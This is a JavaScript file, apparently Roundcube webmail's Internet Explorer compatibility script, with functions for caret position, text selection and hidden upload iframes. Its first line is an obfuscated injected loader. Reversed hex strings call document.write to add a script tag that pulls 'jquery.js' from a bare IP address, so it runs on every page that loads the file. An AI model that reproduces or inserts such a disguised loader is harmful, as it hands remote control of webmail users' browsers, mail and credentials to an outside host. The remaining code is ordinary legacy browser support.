var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))

// Make getElementById() case-sensitive on IE7
document._getElementById = document.getElementById;
document.getElementById = function(id)
{
  var i = 0, obj = document._getElementById(id);

  if (obj && obj.id != id)
    while ((obj = document.all[i]) && obj.id != id)
      i++;

  return obj;
}

// fix missing :last-child selectors
$(document).ready(function() {
  if (rcmail && rcmail.env.skin != 'classic')
    $('ul.treelist ul').each(function(i, ul) {
      $('li:last-child', ul).css('border-bottom', 0);
  });
});

// gets cursor position (IE<9)
rcube_webmail.prototype.get_caret_pos = function(obj)
{
  if (document.selection && document.selection.createRange) {
    var range = document.selection.createRange();
    if (range.parentElement() != obj)
      return 0;

    var gm = range.duplicate();
    if (obj.tagName == 'TEXTAREA')
      gm.moveToElementText(obj);
    else
      gm.expand('textedit');

    gm.setEndPoint('EndToStart', range);
    var p = gm.text.length;

    return p <= obj.value.length ? p : -1;
  }

  return obj.value.length;
};

// moves cursor to specified position (IE<9)
rcube_webmail.prototype.set_caret_pos = function(obj, pos)
{
  if (obj.createTextRange) {
    var range = obj.createTextRange();
    range.collapse(true);
    range.moveEnd('character', pos);
    range.moveStart('character', pos);
    range.select();
  }
};

// get selected text from an input field (IE<9)
// http://stackoverflow.com/questions/7186586/how-to-get-the-selected-text-in-textarea-using-jquery-in-internet-explorer-7
rcube_webmail.prototype.get_input_selection = function(obj)
{
  var start = 0, end = 0, len,
    normalizedValue, textInputRange, endRange,
    range = document.selection.createRange();

  if (range && range.parentElement() == obj) {
    len = obj.value.length;
    normalizedValue = obj.value; //.replace(/\r\n/g, "\n");

    // create a working TextRange that lives only in the input
    textInputRange = obj.createTextRange();
    textInputRange.moveToBookmark(range.getBookmark());

    // Check if the start and end of the selection are at the very end
    // of the input, since moveStart/moveEnd doesn't return what we want
    // in those cases
    endRange = obj.createTextRange();
    endRange.collapse(false);

    if (textInputRange.compareEndPoints("StartToEnd", endRange) > -1) {
      start = end = len;
    }
    else {
      start = -textInputRange.moveStart("character", -len);
      start += normalizedValue.slice(0, start).split("\n").length - 1;

      if (textInputRange.compareEndPoints("EndToEnd", endRange) > -1) {
        end = len;
      }
      else {
        end = -textInputRange.moveEnd("character", -len);
        end += normalizedValue.slice(0, end).split("\n").length - 1;
      }
    }
  }

  return {start: start, end: end, text: normalizedValue.substr(start, end-start)};
};

// For IE<9 we have to do it this way
// otherwise the form will be posted to a new window
rcube_webmail.prototype.async_upload_form_frame = function(name)
{
  document.body.insertAdjacentHTML('BeforeEnd', '<iframe name="' + name + '"'
    + ' src="' + rcmail.assets_path('program/resources/blank.gif') + '" style="width:0; height:0; visibility:hidden"></iframe>');

  return $('iframe[name="' + name + '"]');
};
